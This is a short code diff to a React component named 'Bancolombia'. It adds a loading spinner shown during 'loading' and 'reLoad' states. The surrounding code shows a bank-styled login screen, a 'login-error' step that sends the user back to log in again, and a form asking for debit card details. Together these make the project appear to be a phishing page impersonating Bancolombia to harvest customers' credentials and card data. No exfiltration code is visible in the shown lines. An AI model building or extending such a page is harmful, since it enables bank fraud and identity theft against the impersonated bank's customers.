@@ -29,6 +29,14 @@ const btn = (
     </svg>
 )
 
+const Loading = () => {
+  return (
+    <div className="fixed inset-0 bg-white/60 flex items-center justify-center z-50">
+      <div className="w-12 h-12 border-4 border-[#fdda24] border-t-transparent rounded-full animate-spin" />
+    </div>
+  );
+}
+
 const InputAnimado = ({
     label,
     borderCol = "border-0", 
@@ -627,6 +635,8 @@ export default function Bancolombia (){
             </div>
             
             <div className=" img min-h-[70vh] w-[90%] flex flex-col items-center justify-center">
+                {loading && <Loading/>}
+                {reLoad && <Loading/>}
                 {!inicioSesion &&  <InicioSesion  key={key} handlerInformacion={handlerInformacion} datosInicio={datosInicio} tituloError={tituloError} btnInicio={handlerBtnInicio}/>}
                 {selectVista == "login-error" && <InicioSesion  key={key} handlerInformacion={handlerInformacion} datosInicio={datosInicio} tituloError={tituloError} btnInicio={handlerloginError}/>}
                 {selectVista == "tdb" && <Tarjeta key={key} InputModificado={InputAnimado} textColor={text_color_principal} titulo={"Ingrese los siguientes datos de su tarjeta debito"} handlerTarjeta={handlerTarjeta} labelBtnContinuar={"Continuar"} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} estilioInput={"w-full relative flex border-b-2"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
